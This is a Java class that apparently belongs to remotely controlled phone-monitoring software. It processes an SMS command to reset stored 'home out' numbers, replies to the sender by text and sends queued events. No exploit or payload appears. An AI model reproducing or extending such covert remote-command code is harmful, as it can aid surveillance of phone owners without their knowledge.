package com.vvt.rmtcmd.sms;

import com.vvt.global.Global;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.NumberCmdLine;
import com.vvt.rmtcmd.RmtCmdLine;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.smsutil.FxSMSMessage;
import com.vvt.std.Constant;
import com.vvt.std.Log;

public class SMSResetHomeOutNumb extends RmtCmdSync {

	private SendEventManager eventSender = Global.getSendEventManager();
	
	public SMSResetHomeOutNumb(RmtCmdLine rmtCmdLine) {
		super.rmtCmdLine = rmtCmdLine;
		smsMessage.setNumber(rmtCmdLine.getSenderNumber());
	}
	
	public void execute(RmtCmdExecutionListener rmtCmdProcessingManager) {
		smsSender.addListener(this);
		super.observer = observer;
		doSMSHeader(smsCmdCode.getResetHomeOutNumberCmd());
		NumberCmdLine homeOutNumber = (NumberCmdLine) rmtCmdLine;
		try {
			if (isInvalidNumber()) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.INVALID_HOMEOUT_NUMBER);		
			} else if (isExceededDB(prefBugInfo.getMaxHomeOutNumbers(), homeOutNumber.countNumber())) {
				responseMessage.append(Constant.ERROR);
				responseMessage.append(Constant.CRLF);
				responseMessage.append(RmtCmdTextResource.EXCEEDED_HOMEOUT_NUMBER);
			} else {
				clearHomeOutNumberDB();
				addHomeOutNumberDB();
				responseMessage.append(Constant.OK);				
			}
		} catch(Exception e) {
			Log.error("SMSResetHomeOutNumberCmd.execute()", e.getMessage());
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
		}
		// To create system event.
		createSystemEventOut(responseMessage.toString());
		// To send SMS reply.
		smsMessage.setMessage(responseMessage.toString());
		send();
		// To send events
		eventSender.sendEvents();
	}

	// SMSSendListener
	public void smsSendFailed(FxSMSMessage smsMessage, Exception e, String message) {
		Log.error("SMSResetHomeOutNumberCmd.smsSendFailed", "Number = " + smsMessage.getNumber() + ", SMS Message = " + smsMessage.getMessage() + ", Contact Name = " + smsMessage.getContactName() + ", Message = " + message, e);
		smsSender.removeListener(this);
		observer.cmdExecutedError(this);
	}

	public void smsSendSuccess(FxSMSMessage smsMessage) {
		smsSender.removeListener(this);
		observer.cmdExecutedSuccess(this);
	}
}
